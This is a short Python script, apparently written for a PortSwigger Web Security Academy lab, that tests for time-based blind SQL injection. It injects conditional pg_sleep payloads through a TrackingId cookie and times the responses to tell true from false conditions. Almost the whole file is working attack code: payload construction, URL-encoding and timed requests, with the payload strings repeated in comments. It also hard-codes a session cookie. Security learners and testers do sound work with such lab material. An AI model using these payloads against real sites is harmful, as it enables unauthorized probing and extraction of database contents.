#!/usr/bin/env python3

import requests
from time import time
import urllib.parse

"""
'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(0)+ELSE+pg_sleep(10)+END--
Cookie: TrackingId=1H0mqQasF2if0yX1; session=RjVw5aZdHmXF6xfpksZR0jz5z2RwNYoY
payload = f'''{trackingid}';SELECT CASE WHEN (1=1) THEN pg_sleep(0) ELSE pg_sleep(10) END--;'''

"""
trackingid = '1H0mqQasF2if0yX1'

url = 'https://0aa4006c044d901780e66c0d006e00c1.web-security-academy.net/'


def main1():
    

    payload = f'''{trackingid}';SELECT CASE WHEN (1=1) THEN pg_sleep(0) ELSE pg_sleep(10) END--;'''
    finalPayload = urllib.parse.quote(payload)

    cookie = {
        'session': 'RjVw5aZdHmXF6xfpksZR0jz5z2RwNYoY',
        'TrackingId': finalPayload
    }
    print("trying pg_sleep(0) using ",finalPayload)
    startTime = time()
    requests.get(url, cookies=cookie)
    endTime = time()

    timeDifference = endTime - startTime

    print(f'[+] The request time difference is: {timeDifference:.2f}s')


"""
'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(0)+ELSE+pg_sleep(10)+END--
Cookie: TrackingId=1H0mqQasF2if0yX1; session=RjVw5aZdHmXF6xfpksZR0jz5z2RwNYoY
payload = f'''{trackingid}';SELECT CASE WHEN (1=2) THEN pg_sleep(0) ELSE pg_sleep(10) END--;'''

"""


def main2():
    url = 'https://0aa4006c044d901780e66c0d006e00c1.web-security-academy.net/'

    payload = f'''{trackingid}';SELECT CASE WHEN (1=2) THEN pg_sleep(0) ELSE pg_sleep(10) END--;'''
    finalPayload = urllib.parse.quote(payload)

    cookie = {
        'session': 'RjVw5aZdHmXF6xfpksZR0jz5z2RwNYoY',
        'TrackingId': finalPayload
    }
    print("trying pg_sleep(10) using ",finalPayload)
    startTime = time()
    requests.get(url, cookies=cookie)
    endTime = time()

    timeDifference = endTime - startTime

    print(f'[+] The request time difference is: {timeDifference:.2f}s')

if __name__ == '__main__':
    main1()
    main2()